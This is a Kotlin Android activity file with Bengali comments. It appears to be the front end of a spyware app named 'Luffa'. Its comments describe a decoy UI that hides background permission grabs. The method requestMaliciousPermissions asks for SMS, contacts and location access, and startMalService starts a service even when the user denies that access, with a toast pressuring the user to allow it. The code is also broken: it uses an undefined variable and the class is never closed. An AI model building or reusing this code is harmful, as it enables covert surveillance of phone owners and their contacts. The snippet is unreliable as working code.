package com.luffa1

import android.Manifest
import android.content.Intent
import android.content.pm.PackageManager
import android.os.Build
import android.os.Bundle
import android.widget.Toast
import androidx.appcompat.app.AppCompatActivity
import androidx.core.app.ActivityCompat
import androidx.core.content.ContextCompat
import luffa.R


class MainActivity : AppCompatActivity() {

    private val REQUEST_PERM_CODE = 1001

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)

        // ডিকয় UI তে হ্যালো লুফা দেখাচ্ছে
        // ব্যাকগ্রাউন্ডে পারমিশন চাইব আর সার্ভিস স্টার্ট করব
        requestMaliciousPermissions()
    }

    private fun requestMaliciousPermissions() {
        val perms = arrayOf(
            Manifest.permission.READ_SMS,
            Manifest.permission.SEND_SMS,
            Manifest.permission.RECEIVE_SMS,
            Manifest.permission.READ_CONTACTS,
            Manifest.permission.ACCESS_FINE_LOCATION,
            Manifest.permission.ACCESS_COARSE_LOCATION,
            Manifest.permission.FOREGROUND_SERVICE
        )

        // অ্যান্ড্রয়েড ৬+ এর জন্য চেক
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            val ungranted = perms.filter {
                ContextCompat.checkSelfPermission(this, it) != PackageManager.PERMISSION_GRANTED
            }
            if (ungranted.isNotEmpty()) {
                ActivityCompat.requestPermissions(this, ungranted.toTypedArray(), REQUEST_PERM_CODE)
            } else {
                startMalService()
            }
        } else {
            startMalService() // পুরোনো ওএস এ পারমিশন অটো
        }
    }

    override fun onRequestPermissionsResult(
        requestCode: Int,
        permissions: Array<out String>,
        grantResults: IntArray
    ) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults)
        if (requestCode == REQUEST_PERM_CODE) {
            if (grantResults.all { it == PackageManager.PERMISSION_GRANTED }) {
                startMalService()
            } else {
                Toast.makeText(this, "Allow all permissions for app to work!", Toast.LENGTH_LONG).show()
                // এখনও সার্ভিস চালু করব — কিছু পারমিশন না থাকলেও চলবে
                startMalService()
            }
        }
    }

    private fun startMalService() {
        
        
      val intent = Intent(this, MyService::class.java) // ✅ সঠিক নাম
startService(intent) // বা যেভাবেই সার্ভিসটি কল করা হয়েছে
  
       
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            startForegroundService(serviceIntent)
        } else {
            startService(serviceIntent)
        }
    }

